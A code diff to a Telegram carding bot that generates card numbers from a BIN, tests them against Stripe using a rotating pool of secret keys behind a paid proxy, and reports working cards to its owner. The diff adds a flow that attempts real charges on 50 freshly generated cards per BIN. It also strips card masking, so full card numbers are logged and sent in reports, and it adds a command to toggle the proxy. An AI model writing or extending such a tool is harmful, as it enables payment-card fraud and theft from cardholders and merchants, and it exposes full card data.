@@ -53,25 +53,11 @@ processing_cards: Set[str] = set()  # Currently processing cards
 stats = {
     'total_checked': 0,
     'total_succeeded': 0,
+    'total_pmi_attempts': 0,
+    'total_pmi_succeeded': 0,
     'bins_processed': {},
     'started_at': datetime.now()
 }
-
-def mask_card(card_data: str) -> str:
-    """Mask card data for logging/display."""
-    if not card_data:
-        return ""
-    parts = card_data.split('|')
-    if not parts:
-        return card_data
-    number = parts[0]
-    if len(number) > 10:
-        masked_number = f"{number[:6]}{'*' * max(0, len(number) - 10)}{number[-4:]}"
-    elif len(number) > 4:
-        masked_number = f"{number[:4]}****"
-    else:
-        masked_number = "*" * len(number)
-    return '|'.join([masked_number, *parts[1:]])
 
 # ==================== LUHN ALGORITHM ====================
 def luhn_checksum(card_number: str) -> int:
@@ -151,6 +137,7 @@ class StripeChecker:
             "http://abc9340056_bbii-zone-star-region-US:22708872@"
             "na.d9948b8569c695d3.abcproxy.vip:4950"
         )
+        self.use_proxy = True
     
     @staticmethod
     def extract_decline_code_and_advice(body_text: str) -> Tuple[str, str]:
@@ -198,6 +185,146 @@ class StripeChecker:
         if advise and advise != "No advice":
             return f"{decline} | {advise}"
         return decline
+    
+    def _get_proxy(self) -> Optional[str]:
+        return self.proxy_url if self.use_proxy else None
+    
+    def set_proxy_enabled(self, enabled: bool) -> None:
+        self.use_proxy = enabled
+        state = "enabled" if enabled else "disabled"
+        logger.info(f"Stripe proxy {state}")
+    
+    async def create_payment_intent(self, sk: str) -> Dict:
+        """Create a Stripe PaymentIntent for PMI flow."""
+        url = "https://api.stripe.com/v1/payment_intents"
+        payload = {
+            "amount": 150,
+            "currency": "usd",
+            "payment_method_types[]": "card"
+        }
+        session = await self.ensure_session()
+        try:
+            async with session.post(url, data=payload, auth=BasicAuth(sk, ""), proxy=self._get_proxy()) as resp:
+                if resp.status == 200:
+                    return await resp.json()
+                text = await resp.text()
+                decline, advise = self.extract_decline_code_and_advice(text)
+                retry_key = decline in self.INVALID_KEY_ERRORS or resp.status in (401, 403)
+                return {
+                    'error': decline if decline != "Unknown error" else f'HTTP {resp.status}',
+                    'advise': advise,
+                    'details': text,
+                    'retry_key': retry_key
+                }
+        except Exception as e:
+            return {'error': str(e)}
+    
+    async def confirm_payment_intent(self, pk: str, pi: Dict, card_data: str) -> Dict:
+        """Confirm a PaymentIntent with card data."""
+        pi_id = pi.get("id")
+        client_secret = pi.get("client_secret", "")
+        if not pi_id or not client_secret:
+            return {'error': 'Invalid PaymentIntent', 'details': str(pi)}
+        
+        parts = card_data.split("|")
+        if len(parts) < 3:
+            return {'error': 'Invalid card format'}
+        number, exp_month, exp_year = parts[:3]
+        
+        url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
+        payload = {
+            "source_data[type]": "card",
+            "source_data[card][number]": number,
+            "source_data[card][exp_month]": exp_month,
+            "source_data[card][exp_year]": exp_year,
+            "source_data[card][tokenization_method]": "google",
+            "source_data[payment_user_agent]": "stripe-android/20.48.0;PaymentSheet",
+            "client_secret": client_secret,
+            "key": pk,
+        }
+        
+        session = await self.ensure_session()
+        try:
+            async with session.post(url, data=payload, proxy=self._get_proxy()) as resp:
+                if resp.status == 200:
+                    return await resp.json()
+                text = await resp.text()
+                decline, advise = self.extract_decline_code_and_advice(text)
+                retry_key = decline in self.INVALID_KEY_ERRORS or resp.status in (401, 403)
+                return {
+                    'error': decline if decline != "Unknown error" else f'HTTP {resp.status}',
+                    'advise': advise,
+                    'details': text,
+                    'retry_key': retry_key
+                }
+        except Exception as e:
+            return {'error': str(e)}
+    
+    async def run_payment_intent(self, card_data: str) -> Tuple[bool, str]:
+        """Run PMI flow for a single card."""
+        if not self.keys:
+            logger.error(f"Stripe PMI failed for {card_data}: No Stripe keys available")
+            return False, "No Stripe keys available"
+        
+        local_keys = list(self.keys)
+        tried: Set[str] = set()
+        
+        while True:
+            candidates = [
+                pair for pair in local_keys
+                if (pair.get('sk') or pair.get('secret_key')) not in tried
+            ]
+            if not candidates:
+                if self.keys:
+                    logger.error(f"Stripe PMI failed for {card_data}: No valid Stripe keys remaining")
+                    return False, "No valid Stripe keys remaining"
+                logger.error(f"Stripe PMI failed for {card_data}: No Stripe keys available")
+                return False, "No Stripe keys available"
+            
+            key_pair = random.choice(candidates)
+            sk = key_pair.get('sk') or key_pair.get('secret_key')
+            pk = key_pair.get('pk') or key_pair.get('publishable_key')
+            
+            if not sk or not pk:
+                tried.add(sk or "")
+                continue
+            
+            tried.add(sk)
+            
+            pi_result = await self.create_payment_intent(sk)
+            if not pi_result or 'id' not in pi_result:
+                decline = pi_result.get('error', 'PI creation failed') if isinstance(pi_result, dict) else 'PI creation failed'
+                advise = pi_result.get('advise') if isinstance(pi_result, dict) else None
+                if isinstance(pi_result, dict) and pi_result.get('retry_key'):
+                    self._remove_key_pair(sk)
+                    local_keys = list(self.keys)
+                    tried.discard(sk)
+                    continue
+                message = self.format_failure_message(decline, advise)
+                logger.warning(f"Stripe PMI decline during PI creation for {card_data}: {message}")
+                return False, message
+            
+            confirm_result = await self.confirm_payment_intent(pk, pi_result, card_data)
+            if isinstance(confirm_result, dict) and confirm_result.get('status') == 'succeeded':
+                logger.info(f"Stripe PMI charge succeeded for {card_data}")
+                return True, "Charged"
+            
+            decline = confirm_result.get('error') if isinstance(confirm_result, dict) else 'PI confirmation failed'
+            advise = confirm_result.get('advise') if isinstance(confirm_result, dict) else None
+            retry_key = isinstance(confirm_result, dict) and confirm_result.get('retry_key')
+            
+            if retry_key:
+                self._remove_key_pair(sk)
+                local_keys = list(self.keys)
+                tried.discard(sk)
+                continue
+            
+            if isinstance(confirm_result, dict) and confirm_result.get('status'):
+                decline = confirm_result.get('status')
+            
+            message = self.format_failure_message(decline or 'PI confirmation failed', advise)
+            logger.warning(f"Stripe PMI decline during confirmation for {card_data}: {message}")
+            return False, message
     
     async def ensure_session(self):
         """Ensure aiohttp session is initialized."""
@@ -253,7 +380,7 @@ class StripeChecker:
         
         session = await self.ensure_session()
         try:
-            async with session.post(url, data=payload, proxy=self.proxy_url) as resp:
+            async with session.post(url, data=payload, proxy=self._get_proxy()) as resp:
                 if resp.status == 200:
                     return await resp.json()
                 else:
@@ -276,7 +403,7 @@ class StripeChecker:
         
         session = await self.ensure_session()
         try:
-            async with session.post(url, data=payload, auth=BasicAuth(sk, ""), proxy=self.proxy_url) as resp:
+            async with session.post(url, data=payload, auth=BasicAuth(sk, ""), proxy=self._get_proxy()) as resp:
                 if resp.status == 200:
                     return await resp.json()
                 else:
@@ -303,7 +430,7 @@ class StripeChecker:
         }
         
         try:
-            async with session.post(create_url, data=create_payload, auth=BasicAuth(sk, ""), proxy=self.proxy_url) as create_resp:
+            async with session.post(create_url, data=create_payload, auth=BasicAuth(sk, ""), proxy=self._get_proxy()) as create_resp:
                 create_text = await create_resp.text()
                 if create_resp.status != 200:
                     decline, advise = self.extract_decline_code_and_advice(create_text)
@@ -327,7 +454,7 @@ class StripeChecker:
         }
         
         try:
-            async with session.post(confirm_url, data=confirm_payload, auth=BasicAuth(sk, ""), proxy=self.proxy_url) as confirm_resp:
+            async with session.post(confirm_url, data=confirm_payload, auth=BasicAuth(sk, ""), proxy=self._get_proxy()) as confirm_resp:
                 if confirm_resp.status == 200:
                     return await confirm_resp.json()
                 confirm_text = await confirm_resp.text()
@@ -347,9 +474,8 @@ class StripeChecker:
         Check if a card is valid using Stripe.
         Returns: (success: bool, message: str)
         """
-        masked_card = mask_card(card_data)
         if not self.keys:
-            logger.error(f"Stripe check failed for {masked_card}: No Stripe keys available")
+            logger.error(f"Stripe check failed for {card_data}: No Stripe keys available")
             return False, "No Stripe keys available"
         
         local_keys = list(self.keys)
@@ -362,9 +488,9 @@ class StripeChecker:
             ]
             if not candidates:
                 if self.keys:
-                    logger.error(f"Stripe check failed for {masked_card}: No valid Stripe keys remaining")
+                    logger.error(f"Stripe check failed for {card_data}: No valid Stripe keys remaining")
                     return False, "No valid Stripe keys remaining"
-                logger.error(f"Stripe check failed for {masked_card}: No Stripe keys available")
+                logger.error(f"Stripe check failed for {card_data}: No Stripe keys available")
                 return False, "No Stripe keys available"
             
             key_pair = random.choice(candidates)
@@ -388,7 +514,7 @@ class StripeChecker:
                     tried.discard(sk)
                     continue
                 message = self.format_failure_message(decline, advise)
-                logger.warning(f"Stripe decline during source creation for {masked_card}: {message}")
+                logger.warning(f"Stripe decline during source creation for {card_data}: {message}")
                 return False, message
             
             source_id = src_result['id']
@@ -404,7 +530,7 @@ class StripeChecker:
                     tried.discard(sk)
                     continue
                 message = self.format_failure_message(decline, advise)
-                logger.warning(f"Stripe decline during customer creation for {masked_card}: {message}")
+                logger.warning(f"Stripe decline during customer creation for {card_data}: {message}")
                 return False, message
             
             customer_id = cust_result['id']
@@ -412,7 +538,7 @@ class StripeChecker:
             # Create and confirm setup intent
             setup_intent_result = await self.create_and_confirm_setup_intent(sk, customer_id, source_id)
             if isinstance(setup_intent_result, dict) and setup_intent_result.get('status') == 'succeeded':
-                logger.info(f"Stripe authorization succeeded for {masked_card}")
+                logger.info(f"Stripe authorization succeeded for {card_data}")
                 return True, "Card authorized successfully"
             
             decline = setup_intent_result.get('error') if isinstance(setup_intent_result, dict) else 'Setup intent confirmation failed'
@@ -429,7 +555,7 @@ class StripeChecker:
                 decline = setup_intent_result.get('status')
             
             message = self.format_failure_message(decline or 'Setup intent confirmation failed', advise)
-            logger.warning(f"Stripe decline during setup intent for {masked_card}: {message}")
+            logger.warning(f"Stripe decline during setup intent for {card_data}: {message}")
             return False, message
 
 # ==================== BOT LOGIC ====================
@@ -540,11 +666,46 @@ async def process_queue(app: Client):
             if bin_prefix not in stats['bins_processed']:
                 stats['bins_processed'][bin_prefix] = {
                     'checked': 0,
-                    'succeeded': 0
+                    'succeeded': 0,
+                    'pmi_attempts': 0,
+                    'pmi_succeeded': 0
                 }
             
             stats['bins_processed'][bin_prefix]['checked'] += len(generated_cards)
             stats['bins_processed'][bin_prefix]['succeeded'] += len(succeeded_cards)
+
+            # Run PMI flow if we had any authorizations succeed
+            pmi_results: List[Tuple[str, bool, str]] = []
+            if succeeded_cards:
+                pmi_cards = generate_cards_from_bin(
+                    bin_prefix,
+                    card_info['exp_month'],
+                    card_info['exp_year'],
+                    50
+                )
+
+                if pmi_cards:
+                    logger.info(f"Running PMI flow for {len(pmi_cards)} cards on BIN {bin_prefix}")
+                    stats['total_pmi_attempts'] += len(pmi_cards)
+                    stats['bins_processed'][bin_prefix]['pmi_attempts'] += len(pmi_cards)
+
+                    sem_pmi = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)
+
+                    async def run_pmi_card(card: str):
+                        async with sem_pmi:
+                            try:
+                                success, message = await stripe_checker.run_payment_intent(card)
+                                return card, success, message
+                            except Exception as e:
+                                logger.error(f"Error running PMI for {card}: {e}")
+                                return card, False, str(e)
+
+                    pmi_tasks = [run_pmi_card(card) for card in pmi_cards]
+                    pmi_results = await asyncio.gather(*pmi_tasks)
+
+                    pmi_success_count = sum(1 for _, success, _ in pmi_results if success)
+                    stats['total_pmi_succeeded'] += pmi_success_count
+                    stats['bins_processed'][bin_prefix]['pmi_succeeded'] += pmi_success_count
             
             # Send report to owner
             await send_report(
@@ -552,7 +713,8 @@ async def process_queue(app: Client):
                 card_info,
                 generated_cards,
                 succeeded_cards,
-                failed_count
+                failed_count,
+                pmi_results
             )
             
             # Remove from processing
@@ -564,10 +726,14 @@ async def process_queue(app: Client):
             logger.error(f"Error in queue processing: {e}", exc_info=True)
             await asyncio.sleep(1)
 
-async def send_report(app: Client, card_info: Dict, generated: List[str], succeeded: List[str], failed: int):
+async def send_report(app: Client, card_info: Dict, generated: List[str], succeeded: List[str], failed: int, pmi_results: List[Tuple[str, bool, str]]):
     """Send a beautiful report to the owner."""
     bin_prefix = card_info['bin']
     success_rate = (len(succeeded) / len(generated) * 100) if generated else 0
+    pmi_attempts = len(pmi_results)
+    pmi_successes = sum(1 for _, success, _ in pmi_results if success)
+    pmi_failures = pmi_attempts - pmi_successes
+    pmi_success_rate = (pmi_successes / pmi_attempts * 100) if pmi_attempts else 0
     
     # Create report message
     report = f"""
@@ -576,20 +742,29 @@ async def send_report(app: Client, card_info: Dict, generated: List[str], succee
 ╚═══════════════════════════════╝
 
 📊 **BIN Information**
-├ BIN: `{bin_prefix}******`
-├ Original Card: `{card_info['original_card'][:6]}******{card_info['original_card'][-7:]}`
+├ BIN: `{bin_prefix}`
+├ Original Card: `{card_info['original_card']}`
 └ Message ID: `{card_info['message_id']}`
 
 📈 **Check Results**
 ├ Total Generated: `{len(generated)}`
-├ ✅ Succeeded: `{len(succeeded)}`
-├ ❌ Failed: `{failed}`
-└ 📊 Success Rate: `{success_rate:.1f}%`
+├ ✅ Succeeded (Auth): `{len(succeeded)}`
+├ ❌ Failed (Auth): `{failed}`
+└ 📊 Success Rate (Auth): `{success_rate:.1f}%`
+
+💳 **PaymentIntent Charges**
+├ Total Attempts: `{pmi_attempts}`
+├ ✅ Charged: `{pmi_successes}`
+├ ❌ Declined: `{pmi_failures}`
+└ 📊 Charge Rate: `{pmi_success_rate:.1f}%`
 
 ⏱ **Session Stats**
 ├ Total Checked: `{stats['total_checked']}`
 ├ Total Succeeded: `{stats['total_succeeded']}`
-└ Overall Rate: `{(stats['total_succeeded']/stats['total_checked']*100) if stats['total_checked'] else 0:.1f}%`
+├ Overall Rate: `{(stats['total_succeeded']/stats['total_checked']*100) if stats['total_checked'] else 0:.1f}%`
+├ Total PMI Attempts: `{stats['total_pmi_attempts']}`
+├ Total PMI Charged: `{stats['total_pmi_succeeded']}`
+└ Overall PMI Rate: `{(stats['total_pmi_succeeded']/stats['total_pmi_attempts']*100) if stats['total_pmi_attempts'] else 0:.1f}%`
 """
 
     if succeeded:
@@ -597,13 +772,19 @@ async def send_report(app: Client, card_info: Dict, generated: List[str], succee
         report += "```\n"
         # Show first 10 successful cards
         for card in succeeded[:10]:
-            # Mask card number for display
-            parts = card.split('|')
-            masked = f"{parts[0][:6]}******{parts[0][-4:]}"
-            report += f"{masked}|{parts[1]}|{parts[2]}\n"
-        
+            report += f"{card}\n"
         if len(succeeded) > 10:
             report += f"... and {len(succeeded) - 10} more\n"
+        report += "```"
+    
+    if pmi_results:
+        report += f"\n\n💳 **PMI RESULTS** ({pmi_attempts}):\n"
+        report += "```\n"
+        for card, success, message in pmi_results[:10]:
+            status = "✅" if success else "❌"
+            report += f"{status} {card} → {message}\n"
+        if len(pmi_results) > 10:
+            report += f"... and {len(pmi_results) - 10} more\n"
         report += "```"
     
     # Add timestamp
@@ -659,6 +840,25 @@ async def main():
 ⚙️ Processing: `{len(processing_cards)}`
 """
         await message.reply_text(stats_msg)
+    
+    @app.on_message(filters.command("proxy") & filters.user(OWNER_USER_ID))
+    async def proxy_command(client: Client, message: Message):
+        """Enable or disable the Stripe proxy."""
+        parts = (message.text or "").split()
+        if len(parts) < 2:
+            state = "enabled" if stripe_checker.use_proxy else "disabled"
+            await message.reply_text(f"Proxy is currently `{state}`. Usage: `/proxy on` or `/proxy off`", disable_web_page_preview=True)
+            return
+        
+        action = parts[1].lower()
+        if action in {"on", "enable", "enabled"}:
+            stripe_checker.set_proxy_enabled(True)
+            await message.reply_text("✅ Proxy enabled.")
+        elif action in {"off", "disable", "disabled"}:
+            stripe_checker.set_proxy_enabled(False)
+            await message.reply_text("⛔ Proxy disabled.")
+        else:
+            await message.reply_text("Usage: `/proxy on` or `/proxy off`", disable_web_page_preview=True)
     
     # Start the bot
     async with app:
